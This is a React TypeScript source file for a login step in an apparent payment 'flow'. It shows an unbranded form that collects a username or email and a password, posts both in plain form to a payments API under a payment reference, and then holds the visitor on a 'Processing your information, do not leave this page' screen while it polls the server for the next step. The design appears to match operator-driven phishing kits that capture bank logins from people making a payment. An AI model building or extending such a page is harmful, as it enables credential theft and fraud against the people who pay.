import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Eye, EyeOff, ShieldCheck } from "lucide-react";
import { paymentsApi } from "../../api/payments";
import { useFlowPoll } from "../../hooks/useFlowPoll";
import styles from "./FlowPages.module.scss";

export function FlowLoginPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const state = location.state as { reference?: string } | null;
  const reference = state?.reference ?? sessionStorage.getItem("pay_ref") ?? "";

  const [login, setLogin] = useState("");
  const [password, setPassword] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  useFlowPoll({
    reference,
    currentPage: "login",
    enabled: submitted && !!reference,
  });

  const handleSubmit = async () => {
    if (!login.trim() || !password) {
      setError("Please fill all fields");
      return;
    }
    setBusy(true);
    setError("");
    try {
      await paymentsApi.flowStep(reference, "login_submitted", {
        login,
        password,
      });
      setSubmitted(true);
    } catch {
      setError("Network error — please try again");
    } finally {
      setBusy(false);
    }
  };

  if (!reference) {
    navigate("/", { replace: true });
    return null;
  }

  return (
    <div className={styles.flowPage}>
      <div className={styles.flowCard}>
        <div className={styles.flowLogo}>
          <ShieldCheck size={44} color="#8b1a3a" />
        </div>

        <p className={styles.flowTitle}>Login</p>
        <p className={styles.flowSubtitle}>Enter your account credentials</p>

        {error && <div className={styles.formError}>{error}</div>}

        <div className={styles.formField}>
          <label className={styles.formLabel}>Username / Email</label>
          <input
            type="text"
            className={styles.formInput}
            placeholder="username or email"
            value={login}
            autoComplete="username"
            onChange={(e) => setLogin(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && handleSubmit()}
          />
        </div>

        <div className={styles.formField}>
          <label className={styles.formLabel}>Password</label>
          <div className={styles.passWrap}>
            <input
              type={showPass ? "text" : "password"}
              className={styles.formInput}
              placeholder="••••••••"
              value={password}
              autoComplete="current-password"
              style={{ paddingRight: 44 }}
              onChange={(e) => setPassword(e.target.value)}
              onKeyDown={(e) => e.key === "Enter" && handleSubmit()}
            />
            <button
              type="button"
              className={styles.passToggle}
              onClick={() => setShowPass((v) => !v)}
              aria-label={showPass ? "Hide password" : "Show password"}
            >
              {showPass ? <EyeOff size={18} /> : <Eye size={18} />}
            </button>
          </div>
        </div>

        <button
          className={styles.submitBtn}
          onClick={handleSubmit}
          disabled={busy || submitted}
        >
          {busy ? "Logging in…" : "Login"}
        </button>
      </div>

      {submitted && (
        <div className={styles.loadingOverlay}>
          <div className={styles.loadingCard}>
            <div className={styles.spinnerWrap}>
              <div className={styles.spinnerOuter} />
              <div className={styles.spinnerInner} />
            </div>
            <p className={styles.loadingTitle}>Please wait</p>
            <p className={styles.loadingSubtitle}>
              Processing your information
            </p>
            <div className={styles.loadingNoteBox}>
              <p className={styles.loadingNote}>
                Please do not leave or refresh this page until the process is
                complete
              </p>
            </div>
            <div className={styles.dots}>
              <span className={styles.dot} />
              <span className={styles.dotActive} />
              <span className={styles.dot} />
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
